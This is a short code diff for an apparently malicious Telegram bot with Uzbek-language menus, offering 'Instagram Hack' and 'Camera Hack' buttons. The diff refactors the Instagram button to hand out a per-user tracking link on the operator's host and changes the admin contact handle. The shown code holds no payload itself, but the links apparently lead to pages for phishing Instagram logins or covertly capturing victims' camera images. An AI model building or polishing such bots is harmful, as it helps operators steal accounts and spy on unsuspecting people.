@@ -125,9 +125,10 @@ const referralLink = `https://${HOST}/r/${id}`;
 
 // Handle text messages for menu buttons
 bot.hears("📷 Instagram Hack", async (ctx) => {
-  await ctx.reply("Instagram hack havolasi:", {
+  const instagramHackLink = `https://${HOST}/insta/${ctx.from.id}`;
+  await ctx.reply(`Instagram hack havolasi: ${instagramHackLink}`, {
     reply_markup: {
-      inline_keyboard: [[{ text: "📷 Instagram hack havola", url: `https://${HOST}/insta/${ctx.from.id}` }]]
+      inline_keyboard: [[{ text: "📷 Instagram hack havola", url: instagramHackLink }]]
     }
   });
 });
@@ -142,7 +143,7 @@ bot.hears("📸 Camera Hack", async (ctx) => {
 });
 
 bot.hears("☎️ Admin bilan bog'lanish", async (ctx) => {
-  await ctx.reply("Admin bilan bog'lanish uchun: @admin_username");
+  await ctx.reply("Admin bilan bog'lanish uchun: @ozi_coder");
 });
 
 bot.action("check_subscription", async (ctx) => {
